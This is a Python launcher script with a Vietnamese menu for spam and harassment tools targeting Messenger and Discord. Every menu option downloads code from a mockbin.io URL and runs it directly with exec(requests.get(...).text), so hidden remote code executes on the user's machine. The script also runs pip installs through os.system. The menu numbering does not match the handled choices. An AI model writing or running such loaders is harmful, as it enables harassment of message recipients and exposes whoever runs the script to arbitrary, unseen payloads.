import requests,sys
from time import sleep
from datetime import datetime, timedelta
import os
try:
	import requests,colorama,prettytable
except:
	os.system("pip install requests")
	os.system("pip install colorama")
	os.system("pip install prettytable")
#màu
xnhac = "\033[1;36m"
do = "\033[1;31m"
luc = "\033[1;32m"
vang = "\033[1;33m"
xduong = "\033[1;34m"
hong = "\033[1;35m"
trang = "\033[1;37m"
whiteb="\033[1;37m"
red="\033[0;31m"
redb="\033[1;31m"
end='\033[0m'
def banner():
 banner = f"""
\033[1;32m╔═══════════════════════════════╗
\033[1;32m║   \033[1;31mNgười Tạo : \033[1;33m𝐓𝐑𝐀𝐍𝐓𝐑𝐎𝐍𝐆𝐍𝐇𝐀𝐍
\033[1;32m║═══════════════════════════════║
\033[1;32m║   \033[1;31mLiên Hệ Zalo : \033[1m
\033[1;32m╚═══════════════════════════════╝
\033[1;37mLưu ý khỉ sử dụng nhé.!

"""
 for X in banner:
  sys.stdout.write(X)
  sys.stdout.flush() 
  sleep(0.00125)
os.system("cls" if os.name == "nt" else "clear")
banner()

print(" \033[1;37m- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -")
print("\033[1;31mAdmin: \033[1;33m#𝐓𝐑𝐀𝐍𝐓𝐑𝐎𝐍𝐆𝐍𝐇𝐀𝐍")                                     
print("\033[1;35mContact Support: nguoiphanxutrithuc")
print("\03SupportHoàng Nhật An Decode - Decode Liên Hệ Zalo : 0772847161 ")
print("- \033[1;37m - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -")
print(" \033[1;37m╔═════════════════════════════════════════════════════════════")                                                     
print("\033[1;32m ║ ➢Chức năng [1] \033[1;36mTreo Spam ")
print("\033[1;37m ║═════════════════════════════════════════════════════════════")                                               
print("\033[1;32m ║ ➢Chức năng [2] \033[1;36mNhây Réo Messenger  ")
print(" \033[1;37m║═════════════════════════════════════════════════════════════")   
print("\033[1;32m ║ ➣Chức năng [3] \033[1;36mNhây ║  #𝐓𝐑𝐀𝐍𝐓𝐑𝐎𝐍𝐆𝐍𝐇𝐀𝐍  ")
print(" \033[1;37m╚═════════════════════════════════════════════════════════════")
print("\033[1;32m ║ ➣Chức năng [5] \033[1;36mTreo Discord  ║ #𝐓𝐑𝐀𝐍𝐓𝐑𝐎𝐍𝐆𝐍𝐇𝐀𝐍 ")
print(" \033[1;37m╚═════════════════════════════════════════════════════════════")
chon = int(input('\033[1;31m[\033[1;37m[=.=]\033[1;31m] \033[1;37m=> \033[1;32mVui Lòng Chọn Chức Năng \033[1;37m: \033[1;33m'))

if chon == 1 :
	 exec(requests.get('https://d71043502d434c27b9aa69a1b738caed.api.mockbin.io').text)

if chon == 2 :

	 exec(requests.get('https://2e478c021f6646e9aa5010a036c0e67e.api.mockbin.io').text)
if chon == 3 :

	exec(requests.get('https://5a1899ed5a544553a4c342bb6cfce4d3.api.mockbin.io').text)

if chon == 4 :

	exec(requests.get('https://efc3cead094d4b9fbb78811908f19e14.api.mockbin.io').text)

	exit()